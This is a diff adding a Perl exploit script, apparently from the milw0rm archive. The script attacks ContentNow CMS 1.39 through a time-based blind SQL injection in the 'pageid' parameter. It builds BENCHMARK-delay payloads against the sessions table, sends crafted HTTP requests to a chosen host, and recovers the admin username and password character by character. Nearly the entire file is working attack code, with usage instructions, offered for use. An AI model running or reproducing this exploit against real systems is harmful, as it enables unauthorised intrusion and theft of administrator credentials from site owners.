@@ -1,0 +1,121 @@
+#!/usr/bin/perl -w
+
+use IO::Socket;
+use strict;
+
+#   ContentNow "pageid" Sql Injection
+# Version  : 1.39
+#     Url  : http://www.contentnow.mf4k.de
+# Author   : Alfredo 'revenge' Pesoli
+# Advisory : http://www.0xcafebabe.it/advisory/contentnow_139_sqlinjection.txt 
+#
+# Description:
+#
+# The "pageid" parameter isn't properly sanitised before being returned in sql query
+# and can be used to inject craft SQL queries, we can use Blind SQL Injection attack
+# to disclose admin credential.
+#
+# Works regardless of magic quotes
+# 
+# http://www.0xcafebabe.it
+# <revenge@0xcafebabe.it>
+
+if (@ARGV < 2) { &usage; }
+
+my $delay	= "1500000";
+my $host        = $ARGV[0];
+my $dir         = $ARGV[1];
+if ($ARGV[2] ) { $delay = $ARGV[2]; }
+
+print "\nTarget url : ".$host.$dir."\n\n";
+$host =~ s/(http:\/\/)//;
+
+my @array = ("user","password");
+
+print "--== Trying to perform sql injection ==--\n\n";
+sleep(1);
+
+&sploit();
+
+sub sploit() {
+	my $x 		= "";
+	my $i		= "";
+	my $string	= "";
+	my $res		= "1";
+	
+	for ( $x=0; $x<=$#array; $x++ ) {
+		my $j = 1;
+		$res  = 1;
+		while ($res) {
+			for ($i=32;$i<=127;$i++) {
+				$res = 0;
+				
+				if ( $x eq 1 ) {
+					next if ( $i < 48 );
+					next if ( ( $i > 57 ) and ( $i < 97 ) );
+					next if ( $i > 102 );
+				}
+
+				my $val  = "index.php?";
+
+				$val .= "pageid=(select(if((ascii(substring($array[$x],$j,1))=$i),benchmark(".$delay.",sha1(13)),0))/**/from/**/cn_sessions/**/where/**/id=1/**/limit/**/1)";
+				my $data=$dir.$val;
+				my $start = time();
+	
+				my $req = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "Error - connection failed\n\n";
+				print $req "GET $data HTTP/1.1\r\n";
+				print $req "Host: $host\r\n";
+				print $req "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 (GNU Linux)\r\n";
+				print $req "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+				print $req "Accept-Language: en-us;q=0.7,en;q=0.3\r\n";
+				print $req "Accept-Encoding: gzip,deflate\r\n";
+				print $req "Keep-Alive: 300\r\n";
+				print $req "Connection: Keep-Alive\r\n";
+				print $req "Cache-Control: no-cache\r\n";
+				print $req "Connection: close\r\n\r\n";
+				
+				while (my $result = <$req>) {
+					if ( $result =~ /404 Not Found/ ) {
+						printf "\n\nFile not found.\n\n";
+						print "\n\n$result\n\n";
+						exit;
+					}
+					if ( $result =~ /400 Bad Request/ ) {
+						printf "\n\nBad request.\n\n";
+						print "\n\n$result\n\n";
+						exit;
+					}
+				}
+				my $end = time();
+				my $dft = $end - $start;
+				
+				if ( $dft > 4 ) {
+					$string .= chr($i);
+					print "\n\tFound : ".chr($i)."\n\n";
+					$res = 1;
+					last;
+				}
+				print "\tTrying : ".chr($i)."\n";
+			}
+			$j++;
+			if ( !$res ) {
+				$array[$x] = $string;
+				$string = "";
+			}
+		}
+	}
+	print "\n----------------------\n";
+	print "Admin username : $array[0]\n";
+	print "Admin password : $array[1]\n\n";
+}
+
+sub usage() {
+    print "\n ContentNow CMS 1.39 'pageid' SQL Injection Exploit (Admin credentials disclosure)\n";
+    print " <revenge\@0xcafebabe.it>\n";
+    print " http://www.0xcafebabe.it\n\n";
+    print "Usage: $0 <target> <directory> [benchmark_delay]\n";
+    print "Example: $0 127.0.0.1 /contentnow/ 2000000\n\n";
+    exit();
+}
+
+# milw0rm.com [2006-11-21]
